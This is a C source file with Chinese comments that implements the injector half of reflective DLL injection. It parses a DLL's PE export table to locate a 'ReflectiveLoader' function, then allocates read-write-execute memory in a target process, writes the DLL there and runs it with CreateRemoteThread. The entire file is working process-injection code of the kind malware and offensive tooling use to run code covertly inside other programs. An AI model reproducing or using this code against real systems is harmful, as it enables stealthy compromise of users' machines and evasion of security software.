/*
 * Reflective DLL Injection - LoadLibraryR Implementation
 *
 * 反射加载辅助函数实现
 */

#include "LoadLibraryR.h"
#include <stdio.h>

// ========================================
// RVA 转文件偏移
// ========================================

DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
    WORD wIndex = 0;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;

    // 获取 NT 头
    pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

    // 获取第一个节头
    pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) +
                                             pNtHeaders->FileHeader.SizeOfOptionalHeader);

    // 如果 RVA 在头部，直接返回
    if (dwRva < pSectionHeader[0].PointerToRawData)
        return dwRva;

    // 遍历所有节，找到包含该 RVA 的节
    for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++) {
        if (dwRva >= pSectionHeader[wIndex].VirtualAddress &&
            dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData)) {
            // 计算文件偏移 = RVA - VirtualAddress + PointerToRawData
            return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
        }
    }

    return 0;
}

// ========================================
// 查找 ReflectiveLoader 导出函数偏移
// ========================================

DWORD GetReflectiveLoaderOffset(VOID *lpReflectiveDllBuffer)
{
    UINT_PTR uiBaseAddress = 0;
    UINT_PTR uiExportDir = 0;
    UINT_PTR uiNameArray = 0;
    UINT_PTR uiAddressArray = 0;
    UINT_PTR uiNameOrdinals = 0;
    DWORD dwCounter = 0;
    DWORD dwCompiledArch = 2; // x64

    uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

    // 获取 NT 头文件偏移
    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

    // 检查架构（必须是 x64）
    if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) { // PE32
        if (dwCompiledArch != 1)
            return 0;
    }
    else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) { // PE64
        if (dwCompiledArch != 2)
            return 0;
    }
    else {
        return 0;
    }

    // 获取导出表地址
    uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    // 获取导出目录文件偏移
    uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

    // 获取导出函数名称数组
    uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

    // 获取导出函数地址数组
    uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

    // 获取导出函数序号数组
    uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

    // 获取导出函数数量
    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

    // 遍历所有导出函数，查找 ReflectiveLoader
    while (dwCounter--) {
        char *cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

        // 检查函数名是否包含 "ReflectiveLoader"
        if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL) {
            // 重新获取地址数组
            uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

            // 通过序号索引获取函数地址
            uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

            // 返回 ReflectiveLoader 的文件偏移
            return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
        }

        // 下一个导出函数
        uiNameArray += sizeof(DWORD);
        uiNameOrdinals += sizeof(WORD);
    }

    return 0;
}

// ========================================
// 远程注入反射 DLL
// ========================================

HANDLE WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
{
    BOOL bSuccess = FALSE;
    LPVOID lpRemoteLibraryBuffer = NULL;
    LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
    HANDLE hThread = NULL;
    DWORD dwReflectiveLoaderOffset = 0;
    DWORD dwThreadId = 0;

    do {
        // 参数检查
        if (!hProcess || !lpBuffer || !dwLength)
            break;

        // 查找 ReflectiveLoader 函数偏移
        dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
        if (!dwReflectiveLoaderOffset) {
            printf("[!] 错误: DLL 没有导出 ReflectiveLoader 函数\n");
            break;
        }

        printf("[*] ReflectiveLoader 偏移: 0x%X\n", dwReflectiveLoaderOffset);

        // 在远程进程分配内存（RWX）
        lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength,
                                              MEM_RESERVE | MEM_COMMIT,
                                              PAGE_EXECUTE_READWRITE);
        if (!lpRemoteLibraryBuffer) {
            printf("[!] VirtualAllocEx 失败: %lu\n", GetLastError());
            break;
        }

        printf("[+] 远程内存分配: 0x%p (大小: %lu 字节)\n", lpRemoteLibraryBuffer, dwLength);

        // 写入 DLL 到远程进程
        if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL)) {
            printf("[!] WriteProcessMemory 失败: %lu\n", GetLastError());
            break;
        }

        printf("[+] DLL 已写入远程进程\n");

        // 计算远程 ReflectiveLoader 地址
        lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

        printf("[*] 远程 ReflectiveLoader 地址: 0x%p\n", lpReflectiveLoader);

        // 创建远程线程执行 ReflectiveLoader
        hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024,
                                    lpReflectiveLoader, lpParameter,
                                    0, &dwThreadId);

        if (!hThread) {
            printf("[!] CreateRemoteThread 失败: %lu\n", GetLastError());
            break;
        }

        printf("[+] 远程线程已创建: TID=%lu\n", dwThreadId);

    } while (0);

    return hThread;
}
